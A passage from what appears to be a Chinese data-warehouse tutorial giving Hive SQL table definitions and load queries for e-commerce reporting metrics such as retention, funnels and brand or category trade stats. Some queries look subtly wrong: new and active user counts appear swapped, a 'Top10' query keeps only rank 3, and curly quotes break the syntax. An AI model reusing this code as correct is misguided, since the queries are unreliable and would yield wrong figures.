src="http://106.12.125.218/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/c8def23c91792b9acc5726ffaef85605.png" alt="图形用户界面, 应用程序描述已自动生成"></p><p><strong>1）建表语句</strong></p><p>DROP TABLE IF EXISTS ads_page_path;</p><p>CREATE EXTERNAL TABLE ads_page_path</p><p>(</p><p>`dt` STRING COMMENT ‘统计日期’,</p><p>`recent_days` BIGINT COMMENT ‘最近天数,1:最近1天,7:最近7天,30:最近30天’,</p><p>`source` STRING COMMENT ‘跳转起始页面ID’,</p><p>`target` STRING COMMENT ‘跳转终到页面ID’,</p><p>`path_count` BIGINT COMMENT ‘跳转次数’</p><p>) COMMENT ‘页面浏览路径分析’</p><p>ROW FORMAT DELIMITED FIELDS TERMINATED BY ‘\t’</p><p>LOCATION ‘/warehouse/gmall/ads/ads_page_path/‘;</p><p><strong>2）数据装载</strong></p><p>insert overwrite table ads_page_path</p><p>select * from ads_page_path</p><p>union</p><p>select</p><p>‘2020-06-14’ dt,</p><p>recent_days,</p><p>source,</p><p>nvl(target,’null’),</p><p>count(*) path_count</p><p>from</p><p>(</p><p>select</p><p>recent_days,</p><p>concat(‘step-‘,rn,’:’,page_id) source,</p><p>concat(‘step-‘,rn+1,’:’,next_page_id) target</p><p>from</p><p>(</p><p>select</p><p>recent_days,</p><p>page_id,</p><p>lead(page_id,1,null) over(partition by session_id,recent_days) next_page_id,</p><p>row_number() over (partition by session_id,recent_days order by view_time) rn</p><p>from dwd_traffic_page_view_inc lateral view explode(array(1,7,30)) tmp as<br>recent_days</p><p>where dt&gt;=date_add(‘2020-06-14’,-recent_days+1)</p><p>)t1</p><p>)t2</p><p>group by recent_days,source,target;</p><h3 id="用户主题"><a href="#用户主题" class="headerlink" title="用户主题"></a>用户主题</h3><h4 id="用户变动统计"><a href="#用户变动统计" class="headerlink" title="用户变动统计"></a>用户变动统计</h4><p>该需求包括两个指标，分别为流失用户数和回流用户数，以下为对两个指标的解释说明。</p><table><thead><tr><th>统计周期</th><th>指标</th><th>说明</th></tr></thead><tbody><tr><td>最近1日</td><td>流失用户数</td><td>之前活跃过的用户，最近一段时间未活跃，就称为流失用户。此处要求统计7日前（只包含7日前当天）活跃，但最近7日未活跃的用户总数。</td></tr><tr><td>最近1日</td><td>回流用户数</td><td>之前的活跃用户，一段时间未活跃（流失），今日又活跃了，就称为回流用户。此处要求统计回流用户总数。</td></tr></tbody></table><p><strong>1）建表语句</strong></p><p>DROP TABLE IF EXISTS ads_user_change;</p><p>CREATE EXTERNAL TABLE ads_user_change</p><p>(</p><p>`dt` STRING COMMENT ‘统计日期’,</p><p>`user_churn_count` BIGINT COMMENT ‘流失用户数’,</p><p>`user_back_count` BIGINT COMMENT ‘回流用户数’</p><p>) COMMENT ‘用户变动统计’</p><p>ROW FORMAT DELIMITED FIELDS TERMINATED BY ‘\t’</p><p>LOCATION ‘/warehouse/gmall/ads/ads_user_change/‘;</p><p><strong>2）数据装载</strong></p><p>insert overwrite table ads_user_change</p><p>select * from ads_user_change</p><p>union</p><p>select</p><p>churn.dt,</p><p>user_churn_count,</p><p>user_back_count</p><p>from</p><p>(</p><p>select</p><p>‘2020-06-14’ dt,</p><p>count(*) user_churn_count</p><p>from dws_user_user_login_td</p><p>where dt=’2020-06-14’</p><p>and login_date_last=date_add(‘2020-06-14’,-7)</p><p>)churn</p><p>join</p><p>(</p><p>select</p><p>‘2020-06-14’ dt,</p><p>count(*) user_back_count</p><p>from</p><p>(</p><p>select</p><p>user_id,</p><p>login_date_last</p><p>from dws_user_user_login_td</p><p>where dt=’2020-06-14’</p><p>)t1</p><p>join</p><p>(</p><p>select</p><p>user_id,</p><p>login_date_last login_date_previous</p><p>from dws_user_user_login_td</p><p>where dt=date_add(‘2020-06-14’,-1)</p><p>)t2</p><p>on t1.user_id=t2.user_id</p><p>where datediff(login_date_last,login_date_previous)&gt;=8</p><p>)back</p><p>on churn.dt=back.dt;</p><h4 id="用户留存率"><a href="#用户留存率" class="headerlink" title="用户留存率"></a>用户留存率</h4><p>留存分析一般包含新增留存和活跃留存分析。</p><p>新增留存分析是分析某天的新增用户中，有多少人有后续的活跃行为。活跃留存分析是分析某天的活跃用户中，有多少人有后续的活跃行为。</p><p>留存分析是衡量产品对用户价值高低的重要指标。</p><p>此处要求统计新增留存率，新增留存率具体是指留存用户数与新增用户数的比值，例如2020-06-14新增100个用户，1日之后（2020-06-15）这100人中有80个人活跃了，那2020-06-14的1日留存数则为80，2020-06-14的1日留存率则为80%。</p><p>要求统计每天的1至7日留存率，如下图所示。</p><p><img src="http://106.12.125.218/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/287a3644e35375f85f48b751bb6a16f8.png" alt="图形用户界面, 应用程序描述已自动生成"></p><p><strong>1）建表语句</strong></p><p>DROP TABLE IF EXISTS ads_user_retention;</p><p>CREATE EXTERNAL TABLE ads_user_retention</p><p>(</p><p>`dt` STRING COMMENT ‘统计日期’,</p><p>`create_date` STRING COMMENT ‘用户新增日期’,</p><p>`retention_day` INT COMMENT ‘截至当前日期留存天数’,</p><p>`retention_count` BIGINT COMMENT ‘留存用户数量’,</p><p>`new_user_count` BIGINT COMMENT ‘新增用户数量’,</p><p>`retention_rate` DECIMAL(16, 2) COMMENT ‘留存率’</p><p>) COMMENT ‘用户留存率’</p><p>ROW FORMAT DELIMITED FIELDS TERMINATED BY ‘\t’</p><p>LOCATION ‘/warehouse/gmall/ads/ads_user_retention/‘;</p><p><strong>2）数据装载</strong></p><p>insert overwrite table ads_user_retention</p><p>select * from ads_user_retention</p><p>union</p><p>select</p><p>‘2020-06-14’ dt,</p><p>login_date_first create_date,</p><p>datediff(‘2020-06-14’,login_date_first) retention_day,</p><p>sum(if(login_date_last=’2020-06-14’,1,0)) retention_count,</p><p>count(*) new_user_count,</p><p>cast(sum(if(login_date_last=’2020-06-14’,1,0))/count(*)*100 as decimal(16,2))<br>retention_rate</p><p>from</p><p>(</p><p>select</p><p>user_id,</p><p>date_id login_date_first</p><p>from dwd_user_register_inc</p><p>where dt&gt;=date_add(‘2020-06-14’,-7)</p><p>and dt&lt;‘2020-06-14’</p><p>)t1</p><p>join</p><p>(</p><p>select</p><p>user_id,</p><p>login_date_last</p><p>from dws_user_user_login_td</p><p>where dt=’2020-06-14’</p><p>)t2</p><p>on t1.user_id=t2.user_id</p><p>group by login_date_first;</p><h4 id="用户新增活跃统计"><a href="#用户新增活跃统计" class="headerlink" title="用户新增活跃统计"></a>用户新增活跃统计</h4><p>需求说明如下</p><table><thead><tr><th>统计周期</th><th>指标</th><th>指标说明</th></tr></thead><tbody><tr><td>最近1、7、30日</td><td>新增用户数</td><td>略</td></tr><tr><td>最近1、7、30日</td><td>活跃用户数</td><td>略</td></tr></tbody></table><p><strong>1）建表语句</strong></p><p>DROP TABLE IF EXISTS ads_user_stats;</p><p>CREATE EXTERNAL TABLE ads_user_stats</p><p>(</p><p>`dt` STRING COMMENT ‘统计日期’,</p><p>`recent_days` BIGINT COMMENT ‘最近n日,1:最近1日,7:最近7日,30:最近30日’,</p><p>`new_user_count` BIGINT COMMENT ‘新增用户数’,</p><p>`active_user_count` BIGINT COMMENT ‘活跃用户数’</p><p>) COMMENT ‘用户新增活跃统计’</p><p>ROW FORMAT DELIMITED FIELDS TERMINATED BY ‘\t’</p><p>LOCATION ‘/warehouse/gmall/ads/ads_user_stats/‘;</p><p><strong>2）数据装载</strong></p><p>insert overwrite table ads_user_stats</p><p>select * from ads_user_stats</p><p>union</p><p>select</p><p>‘2020-06-14’ dt,</p><p>t1.recent_days,</p><p>new_user_count,</p><p>active_user_count</p><p>from</p><p>(</p><p>select</p><p>recent_days,</p><p>sum(if(login_date_last&gt;=date_add(‘2020-06-14’,-recent_days+1),1,0))<br>new_user_count</p><p>from dws_user_user_login_td lateral view explode(array(1,7,30)) tmp as<br>recent_days</p><p>where dt=’2020-06-14’</p><p>group by recent_days</p><p>)t1</p><p>join</p><p>(</p><p>select</p><p>recent_days,</p><p>sum(if(date_id&gt;=date_add(‘2020-06-14’,-recent_days+1),1,0)) active_user_count</p><p>from dwd_user_register_inc lateral view explode(array(1,7,30)) tmp as<br>recent_days</p><p>group by recent_days</p><p>)t2</p><p>on t1.recent_days=t2.recent_days;</p><h4 id="用户行为漏斗分析"><a href="#用户行为漏斗分析" class="headerlink" title="用户行为漏斗分析"></a>用户行为漏斗分析</h4><p>漏斗分析是一个数据分析模型，它能够科学反映一个业务过程从起点到终点各阶段用户转化情况。由于其能将各阶段环节都展示出来，故哪个阶段存在问题，就能一目了然。</p><p><img src="http://106.12.125.218/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/f0bc0e0694859a6902469b238252b58a.png" alt="图表, 漏斗图 描述已自动生成"></p><p>该需求要求统计一个完整的购物流程各个阶段的人数，具体说明如下：</p><table><thead><tr><th>统计周期</th><th>指标</th><th>说明</th></tr></thead><tbody><tr><td>最近1、7、30日</td><td>首页浏览人数</td><td>略</td></tr><tr><td>最近1、7、30日</td><td>商品详情页浏览人数</td><td>略</td></tr><tr><td>最近1、7、30日</td><td>加购人数</td><td>略</td></tr><tr><td>最近1、7、30日</td><td>下单人数</td><td>略</td></tr><tr><td>最近1、7、30日</td><td>支付人数</td><td>支付成功人数</td></tr></tbody></table><p><strong>1）建表语句</strong></p><p>DROP TABLE IF EXISTS ads_user_action;</p><p>CREATE EXTERNAL TABLE ads_user_action</p><p>(</p><p>`dt` STRING COMMENT ‘统计日期’,</p><p>`recent_days` BIGINT COMMENT ‘最近天数,1:最近1天,7:最近7天,30:最近30天’,</p><p>`home_count` BIGINT COMMENT ‘浏览首页人数’,</p><p>`good_detail_count` BIGINT COMMENT ‘浏览商品详情页人数’,</p><p>`cart_count` BIGINT COMMENT ‘加入购物车人数’,</p><p>`order_count` BIGINT COMMENT ‘下单人数’,</p><p>`payment_count` BIGINT COMMENT ‘支付人数’</p><p>) COMMENT ‘漏斗分析’</p><p>ROW FORMAT DELIMITED FIELDS TERMINATED BY ‘\t’</p><p>LOCATION ‘/warehouse/gmall/ads/ads_user_action/‘;</p><p><strong>2）数据装载</strong></p><p>insert overwrite table ads_user_action</p><p>select * from ads_user_action</p><p>union</p><p>select</p><p>‘2020-06-14’ dt,</p><p>page.recent_days,</p><p>home_count,</p><p>good_detail_count,</p><p>cart_count,</p><p>order_count,</p><p>payment_count</p><p>from</p><p>(</p><p>select</p><p>1 recent_days,</p><p>sum(if(page_id=’home’,1,0)) home_count,</p><p>sum(if(page_id=’good_detail’,1,0)) good_detail_count</p><p>from dws_traffic_page_visitor_page_view_1d</p><p>where dt=’2020-06-14’</p><p>and page_id in (‘home’,’good_detail’)</p><p>union all</p><p>select</p><p>recent_days,</p><p>sum(if(page_id=’home’ and view_count&gt;0,1,0)),</p><p>sum(if(page_id=’good_detail’ and view_count&gt;0,1,0))</p><p>from</p><p>(</p><p>select</p><p>recent_days,</p><p>page_id,</p><p>case recent_days</p><p>when 7 then view_count_7d</p><p>when 30 then view_count_30d</p><p>end view_count</p><p>from dws_traffic_page_visitor_page_view_nd lateral view explode(array(7,30)) tmp<br>as recent_days</p><p>where dt=’2020-06-14’</p><p>and page_id in (‘home’,’good_detail’)</p><p>)t1</p><p>group by recent_days</p><p>)page</p><p>join</p><p>(</p><p>select</p><p>1 recent_days,</p><p>count(*) cart_count</p><p>from dws_trade_user_cart_add_1d</p><p>where dt=’2020-06-14’</p><p>union all</p><p>select</p><p>recent_days,</p><p>sum(if(cart_count&gt;0,1,0))</p><p>from</p><p>(</p><p>select</p><p>recent_days,</p><p>case recent_days</p><p>when 7 then cart_add_count_7d</p><p>when 30 then cart_add_count_30d</p><p>end cart_count</p><p>from dws_trade_user_cart_add_nd lateral view explode(array(7,30)) tmp as<br>recent_days</p><p>where dt=’2020-06-14’</p><p>)t1</p><p>group by recent_days</p><p>)cart</p><p>on page.recent_days=cart.recent_days</p><p>join</p><p>(</p><p>select</p><p>1 recent_days,</p><p>count(*) order_count</p><p>from dws_trade_user_order_1d</p><p>where dt=’2020-06-14’</p><p>union all</p><p>select</p><p>recent_days,</p><p>sum(if(order_count&gt;0,1,0))</p><p>from</p><p>(</p><p>select</p><p>recent_days,</p><p>case recent_days</p><p>when 7 then order_count_7d</p><p>when 30 then order_count_30d</p><p>end order_count</p><p>from dws_trade_user_order_nd lateral view explode(array(7,30)) tmp as<br>recent_days</p><p>where dt=’2020-06-14’</p><p>)t1</p><p>group by recent_days</p><p>)ord</p><p>on page.recent_days=ord.recent_days</p><p>join</p><p>(</p><p>select</p><p>1 recent_days,</p><p>count(*) payment_count</p><p>from dws_trade_user_payment_1d</p><p>where dt=’2020-06-14’</p><p>union all</p><p>select</p><p>recent_days,</p><p>sum(if(order_count&gt;0,1,0))</p><p>from</p><p>(</p><p>select</p><p>recent_days,</p><p>case recent_days</p><p>when 7 then payment_count_7d</p><p>when 30 then payment_count_30d</p><p>end order_count</p><p>from dws_trade_user_payment_nd lateral view explode(array(7,30)) tmp as<br>recent_days</p><p>where dt=’2020-06-14’</p><p>)t1</p><p>group by recent_days</p><p>)pay</p><p>on page.recent_days=pay.recent_days;</p><h4 id="新增交易用户统计"><a href="#新增交易用户统计" class="headerlink" title="新增交易用户统计"></a>新增交易用户统计</h4><p>需求说明如下</p><table><thead><tr><th>统计周期</th><th>指标</th><th>说明</th></tr></thead><tbody><tr><td>最近1、7、30日</td><td>新增下单人数</td><td>略</td></tr><tr><td>最近1、7、30日</td><td>新增支付人数</td><td>略</td></tr></tbody></table><p><strong>1）建表语句</strong></p><p>DROP TABLE IF EXISTS ads_new_buyer_stats;</p><p>CREATE EXTERNAL TABLE ads_new_buyer_stats</p><p>(</p><p>`dt` STRING COMMENT ‘统计日期’,</p><p>`recent_days` BIGINT COMMENT ‘最近天数,1:最近1天,7:最近7天,30:最近30天’,</p><p>`new_order_user_count` BIGINT COMMENT ‘新增下单人数’,</p><p>`new_payment_user_count` BIGINT COMMENT ‘新增支付人数’</p><p>) COMMENT ‘新增交易用户统计’</p><p>ROW FORMAT DELIMITED FIELDS TERMINATED BY ‘\t’</p><p>LOCATION ‘/warehouse/gmall/ads/ads_new_buyer_stats/‘;</p><p><strong>2）数据装载</strong></p><p>insert overwrite table ads_new_buyer_stats</p><p>select * from ads_new_buyer_stats</p><p>union</p><p>select</p><p>‘2020-06-14’,</p><p>odr.recent_days,</p><p>new_order_user_count,</p><p>new_payment_user_count</p><p>from</p><p>(</p><p>select</p><p>recent_days,</p><p>sum(if(order_date_first&gt;=date_add(‘2020-06-14’,-recent_days+1),1,0))<br>new_order_user_count</p><p>from dws_trade_user_order_td lateral view explode(array(1,7,30)) tmp as<br>recent_days</p><p>where dt=’2020-06-14’</p><p>group by recent_days</p><p>)odr</p><p>join</p><p>(</p><p>select</p><p>recent_days,</p><p>sum(if(payment_date_first&gt;=date_add(‘2020-06-14’,-recent_days+1),1,0))<br>new_payment_user_count</p><p>from dws_trade_user_payment_td lateral view explode(array(1,7,30)) tmp as<br>recent_days</p><p>where dt=’2020-06-14’</p><p>group by recent_days</p><p>)pay</p><p>on odr.recent_days=pay.recent_days;</p><h3 id="商品主题"><a href="#商品主题" class="headerlink" title="商品主题"></a>商品主题</h3><h4 id="最近7-30日各品牌复购率"><a href="#最近7-30日各品牌复购率" class="headerlink" title="最近7/30日各品牌复购率"></a>最近7/30日各品牌复购率</h4><p>需求说明如下</p><table><thead><tr><th>统计周期</th><th>统计粒度</th><th>指标</th><th>说明</th></tr></thead><tbody><tr><td>最近7、30日</td><td>品牌</td><td>复购率</td><td>重复购买人数占购买人数比例</td></tr></tbody></table><p><strong>1）建表语句</strong></p><p>DROP TABLE IF EXISTS ads_repeat_purchase_by_tm;</p><p>CREATE EXTERNAL TABLE ads_repeat_purchase_by_tm</p><p>(</p><p>`dt` STRING COMMENT ‘统计日期’,</p><p>`recent_days` BIGINT COMMENT ‘最近天数,7:最近7天,30:最近30天’,</p><p>`tm_id` STRING COMMENT ‘品牌ID’,</p><p>`tm_name` STRING COMMENT ‘品牌名称’,</p><p>`order_repeat_rate` DECIMAL(16, 2) COMMENT ‘复购率’</p><p>) COMMENT ‘各品牌复购率统计’</p><p>ROW FORMAT DELIMITED FIELDS TERMINATED BY ‘\t’</p><p>LOCATION ‘/warehouse/gmall/ads/ads_repeat_purchase_by_tm/‘;</p><p><strong>2）数据装载</strong></p><p>insert overwrite table ads_repeat_purchase_by_tm</p><p>select * from ads_repeat_purchase_by_tm</p><p>union</p><p>select</p><p>‘2020-06-14’ dt,</p><p>recent_days,</p><p>tm_id,</p><p>tm_name,</p><p>cast(sum(if(order_count&gt;=2,1,0))/sum(if(order_count&gt;=1,1,0)) as decimal(16,2))</p><p>from</p><p>(</p><p>select</p><p>‘2020-06-14’ dt,</p><p>recent_days,</p><p>user_id,</p><p>tm_id,</p><p>tm_name,</p><p>sum(order_count) order_count</p><p>from</p><p>(</p><p>select</p><p>recent_days,</p><p>user_id,</p><p>tm_id,</p><p>tm_name,</p><p>case recent_days</p><p>when 7 then order_count_7d</p><p>when 30 then order_count_30d</p><p>end order_count</p><p>from dws_trade_user_sku_order_nd lateral view explode(array(7,30)) tmp as<br>recent_days</p><p>where dt=’2020-06-14’</p><p>)t1</p><p>group by recent_days,user_id,tm_id,tm_name</p><p>)t2</p><p>group by recent_days,tm_id,tm_name;</p><h4 id="各品牌商品交易统计"><a href="#各品牌商品交易统计" class="headerlink" title="各品牌商品交易统计"></a>各品牌商品交易统计</h4><p>需求说明如下</p><table><thead><tr><th>统计周期</th><th>统计粒度</th><th>指标</th><th>说明</th></tr></thead><tbody><tr><td>最近1、7、30日</td><td>品牌</td><td>订单数</td><td>略</td></tr><tr><td>最近1、7、30日</td><td>品牌</td><td>订单人数</td><td>略</td></tr><tr><td>最近1、7、30日</td><td>品牌</td><td>退单数</td><td>略</td></tr><tr><td>最近1、7、30日</td><td>品牌</td><td>退单人数</td><td>略</td></tr></tbody></table><p><strong>1）建表语句</strong></p><p>DROP TABLE IF EXISTS ads_trade_stats_by_tm;</p><p>CREATE EXTERNAL TABLE ads_trade_stats_by_tm</p><p>(</p><p>`dt` STRING COMMENT ‘统计日期’,</p><p>`recent_days` BIGINT COMMENT ‘最近天数,1:最近1天,7:最近7天,30:最近30天’,</p><p>`tm_id` STRING COMMENT ‘品牌ID’,</p><p>`tm_name` STRING COMMENT ‘品牌名称’,</p><p>`order_count` BIGINT COMMENT ‘订单数’,</p><p>`order_user_count` BIGINT COMMENT ‘订单人数’,</p><p>`order_refund_count` BIGINT COMMENT ‘退单数’,</p><p>`order_refund_user_count` BIGINT COMMENT ‘退单人数’</p><p>) COMMENT ‘各品牌商品交易统计’</p><p>ROW FORMAT DELIMITED FIELDS TERMINATED BY ‘\t’</p><p>LOCATION ‘/warehouse/gmall/ads/ads_trade_stats_by_tm/‘;</p><p><strong>2）数据装载</strong></p><p>insert overwrite table ads_trade_stats_by_tm</p><p>select * from ads_trade_stats_by_tm</p><p>union</p><p>select</p><p>‘2020-06-14’ dt,</p><p>nvl(odr.recent_days,refund.recent_days),</p><p>nvl(odr.tm_id,refund.tm_id),</p><p>nvl(odr.tm_name,refund.tm_name),</p><p>nvl(order_count,0),</p><p>nvl(order_user_count,0),</p><p>nvl(order_refund_count,0),</p><p>nvl(order_refund_user_count,0)</p><p>from</p><p>(</p><p>select</p><p>1 recent_days,</p><p>tm_id,</p><p>tm_name,</p><p>sum(order_count_1d) order_count,</p><p>count(distinct(user_id)) order_user_count</p><p>from dws_trade_user_sku_order_1d</p><p>where dt=’2020-06-14’</p><p>group by tm_id,tm_name</p><p>union all</p><p>select</p><p>recent_days,</p><p>tm_id,</p><p>tm_name,</p><p>sum(order_count),</p><p>count(distinct(if(order_count&gt;0,user_id,null)))</p><p>from</p><p>(</p><p>select</p><p>recent_days,</p><p>user_id,</p><p>tm_id,</p><p>tm_name,</p><p>case recent_days</p><p>when 7 then order_count_7d</p><p>when 30 then order_count_30d</p><p>end order_count</p><p>from dws_trade_user_sku_order_nd lateral view explode(array(7,30)) tmp as<br>recent_days</p><p>where dt=’2020-06-14’</p><p>)t1</p><p>group by recent_days,tm_id,tm_name</p><p>)odr</p><p>full outer join</p><p>(</p><p>select</p><p>1 recent_days,</p><p>tm_id,</p><p>tm_name,</p><p>sum(order_refund_count_1d) order_refund_count,</p><p>count(distinct(user_id)) order_refund_user_count</p><p>from dws_trade_user_sku_order_refund_1d</p><p>where dt=’2020-06-14’</p><p>group by tm_id,tm_name</p><p>union all</p><p>select</p><p>recent_days,</p><p>tm_id,</p><p>tm_name,</p><p>sum(order_refund_count),</p><p>count(if(order_refund_count&gt;0,user_id,null))</p><p>from</p><p>(</p><p>select</p><p>recent_days,</p><p>user_id,</p><p>tm_id,</p><p>tm_name,</p><p>case recent_days</p><p>when 7 then order_refund_count_7d</p><p>when 30 then order_refund_count_30d</p><p>end order_refund_count</p><p>from dws_trade_user_sku_order_refund_nd lateral view explode(array(7,30)) tmp as<br>recent_days</p><p>where dt=’2020-06-14’</p><p>)t1</p><p>group by recent_days,tm_id,tm_name</p><p>)refund</p><p>on odr.recent_days=refund.recent_days</p><p>and odr.tm_id=refund.tm_id</p><p>and odr.tm_name=refund.tm_name;</p><h4 id="各品类商品交易统计"><a href="#各品类商品交易统计" class="headerlink" title="各品类商品交易统计"></a>各品类商品交易统计</h4><p>需求说明如下</p><table><thead><tr><th>统计周期</th><th>统计粒度</th><th>指标</th><th>说明</th></tr></thead><tbody><tr><td>最近1、7、30日</td><td>品类</td><td>订单数</td><td>略</td></tr><tr><td>最近1、7、30日</td><td>品类</td><td>订单人数</td><td>略</td></tr><tr><td>最近1、7、30日</td><td>品类</td><td>退单数</td><td>略</td></tr><tr><td>最近1、7、30日</td><td>品类</td><td>退单人数</td><td>略</td></tr></tbody></table><p><strong>1）建表语句</strong></p><p>DROP TABLE IF EXISTS ads_trade_stats_by_cate;</p><p>CREATE EXTERNAL TABLE ads_trade_stats_by_cate</p><p>(</p><p>`dt` STRING COMMENT ‘统计日期’,</p><p>`recent_days` BIGINT COMMENT ‘最近天数,1:最近1天,7:最近7天,30:最近30天’,</p><p>`category1_id` STRING COMMENT ‘一级分类id’,</p><p>`category1_name` STRING COMMENT ‘一级分类名称’,</p><p>`category2_id` STRING COMMENT ‘二级分类id’,</p><p>`category2_name` STRING COMMENT ‘二级分类名称’,</p><p>`category3_id` STRING COMMENT ‘三级分类id’,</p><p>`category3_name` STRING COMMENT ‘三级分类名称’,</p><p>`order_count` BIGINT COMMENT ‘订单数’,</p><p>`order_user_count` BIGINT COMMENT ‘订单人数’,</p><p>`order_refund_count` BIGINT COMMENT ‘退单数’,</p><p>`order_refund_user_count` BIGINT COMMENT ‘退单人数’</p><p>) COMMENT ‘各分类商品交易统计’</p><p>ROW FORMAT DELIMITED FIELDS TERMINATED BY ‘\t’</p><p>LOCATION ‘/warehouse/gmall/ads/ads_trade_stats_by_cate/‘;</p><p><strong>2）数据装载</strong></p><p>insert overwrite table ads_trade_stats_by_cate</p><p>select * from ads_trade_stats_by_cate</p><p>union</p><p>select</p><p>‘2020-06-14’ dt,</p><p>nvl(odr.recent_days,refund.recent_days),</p><p>nvl(odr.category1_id,refund.category1_id),</p><p>nvl(odr.category1_name,refund.category1_name),</p><p>nvl(odr.category2_id,refund.category2_id),</p><p>nvl(odr.category2_name,refund.category2_name),</p><p>nvl(odr.category3_id,refund.category3_id),</p><p>nvl(odr.category3_name,refund.category3_name),</p><p>nvl(order_count,0),</p><p>nvl(order_user_count,0),</p><p>nvl(order_refund_count,0),</p><p>nvl(order_refund_user_count,0)</p><p>from</p><p>(</p><p>select</p><p>1 recent_days,</p><p>category1_id,</p><p>category1_name,</p><p>category2_id,</p><p>category2_name,</p><p>category3_id,</p><p>category3_name,</p><p>sum(order_count_1d) order_count,</p><p>count(distinct(user_id)) order_user_count</p><p>from dws_trade_user_sku_order_1d</p><p>where dt=’2020-06-14’</p><p>group by<br>category1_id,category1_name,category2_id,category2_name,category3_id,category3_name</p><p>union all</p><p>select</p><p>recent_days,</p><p>category1_id,</p><p>category1_name,</p><p>category2_id,</p><p>category2_name,</p><p>category3_id,</p><p>category3_name,</p><p>sum(order_count),</p><p>count(distinct(if(order_count&gt;0,user_id,null)))</p><p>from</p><p>(</p><p>select</p><p>recent_days,</p><p>user_id,</p><p>category1_id,</p><p>category1_name,</p><p>category2_id,</p><p>category2_name,</p><p>category3_id,</p><p>category3_name,</p><p>case recent_days</p><p>when 7 then order_count_7d</p><p>when 30 then order_count_30d</p><p>end order_count</p><p>from dws_trade_user_sku_order_nd lateral view explode(array(7,30)) tmp as<br>recent_days</p><p>where dt=’2020-06-14’</p><p>)t1</p><p>group by<br>recent_days,category1_id,category1_name,category2_id,category2_name,category3_id,category3_name</p><p>)odr</p><p>full outer join</p><p>(</p><p>select</p><p>1 recent_days,</p><p>category1_id,</p><p>category1_name,</p><p>category2_id,</p><p>category2_name,</p><p>category3_id,</p><p>category3_name,</p><p>sum(order_refund_count_1d) order_refund_count,</p><p>count(distinct(user_id)) order_refund_user_count</p><p>from dws_trade_user_sku_order_refund_1d</p><p>where dt=’2020-06-14’</p><p>group by<br>category1_id,category1_name,category2_id,category2_name,category3_id,category3_name</p><p>union all</p><p>select</p><p>recent_days,</p><p>category1_id,</p><p>category1_name,</p><p>category2_id,</p><p>category2_name,</p><p>category3_id,</p><p>category3_name,</p><p>sum(order_refund_count),</p><p>count(distinct(if(order_refund_count&gt;0,user_id,null)))</p><p>from</p><p>(</p><p>select</p><p>recent_days,</p><p>user_id,</p><p>category1_id,</p><p>category1_name,</p><p>category2_id,</p><p>category2_name,</p><p>category3_id,</p><p>category3_name,</p><p>case recent_days</p><p>when 7 then order_refund_count_7d</p><p>when 30 then order_refund_count_30d</p><p>end order_refund_count</p><p>from dws_trade_user_sku_order_refund_nd lateral view explode(array(7,30)) tmp as<br>recent_days</p><p>where dt=’2020-06-14’</p><p>)t1</p><p>group by<br>recent_days,category1_id,category1_name,category2_id,category2_name,category3_id,category3_name</p><p>)refund</p><p>on odr.recent_days=refund.recent_days</p><p>and odr.category1_id=refund.category1_id</p><p>and odr.category1_name=refund.category1_name</p><p>and odr.category2_id=refund.category2_id</p><p>and odr.category2_name=refund.category2_name</p><p>and odr.category3_id=refund.category3_id</p><p>and odr.category3_name=refund.category3_name;</p><h4 id="各分类商品购物车存量Top10"><a href="#各分类商品购物车存量Top10" class="headerlink" title="各分类商品购物车存量Top10"></a>各分类商品购物车存量Top10</h4><p><strong>1）建表语句</strong></p><p>DROP TABLE IF EXISTS ads_sku_cart_num_top3_by_cate;</p><p>CREATE EXTERNAL TABLE ads_sku_cart_num_top3_by_cate</p><p>(</p><p>`dt` STRING COMMENT ‘统计日期’,</p><p>`category1_id` STRING COMMENT ‘一级分类ID’,</p><p>`category1_name` STRING COMMENT ‘一级分类名称’,</p><p>`category2_id` STRING COMMENT ‘二级分类ID’,</p><p>`category2_name` STRING COMMENT ‘二级分类名称’,</p><p>`category3_id` STRING COMMENT ‘三级分类ID’,</p><p>`category3_name` STRING COMMENT ‘三级分类名称’,</p><p>`sku_id` STRING COMMENT ‘商品id’,</p><p>`sku_name` STRING COMMENT ‘商品名称’,</p><p>`cart_num` BIGINT COMMENT ‘购物车中商品数量’,</p><p>`rk` BIGINT COMMENT ‘排名’</p><p>) COMMENT ‘各分类商品购物车存量Top10’</p><p>ROW FORMAT DELIMITED FIELDS TERMINATED BY ‘\t’</p><p>LOCATION ‘/warehouse/gmall/ads/ads_sku_cart_num_top3_by_cate/‘;</p><p><strong>2）数据装载</strong></p><p>insert overwrite table ads_sku_cart_num_top3_by_cate</p><p>select * from ads_sku_cart_num_top3_by_cate</p><p>union</p><p>select</p><p>‘2020-06-14’ dt,</p><p>category1_id,</p><p>category1_name,</p><p>category2_id,</p><p>category2_name,</p><p>category3_id,</p><p>category3_name,</p><p>sku_id,</p><p>sku_name,</p><p>cart_num,</p><p>rk</p><p>from</p><p>(</p><p>select</p><p>sku_id,</p><p>sku_name,</p><p>category1_id,</p><p>category1_name,</p><p>category2_id,</p><p>category2_name,</p><p>category3_id,</p><p>category3_name,</p><p>cart_num,</p><p>rank() over (partition by category1_id,category2_id,category3_id order by<br>cart_num desc) rk</p><p>from</p><p>(</p><p>select</p><p>sku_id,</p><p>sum(sku_num) cart_num</p><p>from dwd_trade_cart_full</p><p>where dt=’2020-06-14’</p><p>group by sku_id</p><p>)cart</p><p>left join</p><p>(</p><p>select</p><p>id,</p><p>sku_name,</p><p>category1_id,</p><p>category1_name,</p><p>category2_id,</p><p>category2_name,</p><p>category3_id,</p><p>category3_name</p><p>from dim_sku_full</p><p>where dt=’2020-06-14’</p><p>)sku</p><p>on cart.sku_id=sku.id</p><p>)t1</p><p>where rk&lt;=3;</p><h3 id="交易主题"><a href="#交易主题" class="headerlink" title="交易主题"></a>交易主题</h3><h4 id="交易综合统计"><a href="#交易综合统计" class="headerlink" title="交易综合统计"></a>交易综合统计</h4><p>需求说明如下</p><table><thead><tr><th>统计周期</th><th>指标</th><th>说明</th></tr></thead><tbody><tr><td>最近1、7、30日</td><td>订单总额</td><td>订单最终金额</td></tr><tr><td>最近1、7、30日</td><td>订单数</td><td>略</td></tr><tr><td>最近1、7、30日</td><td>订单人数</td><td>略</td></tr><tr><td>最近1、7、30日</td><td>退单数</td><td>略</td></tr><tr><td>最近1、7、30日</td><td>退单人数</td><td>略</td></tr></tbody></table><p><strong>1）建表语句</strong></p><p>DROP TABLE IF EXISTS ads_trade_stats;</p><p>CREATE EXTERNAL TABLE ads_trade_stats</p><p>(</p><p>`dt` STRING COMMENT 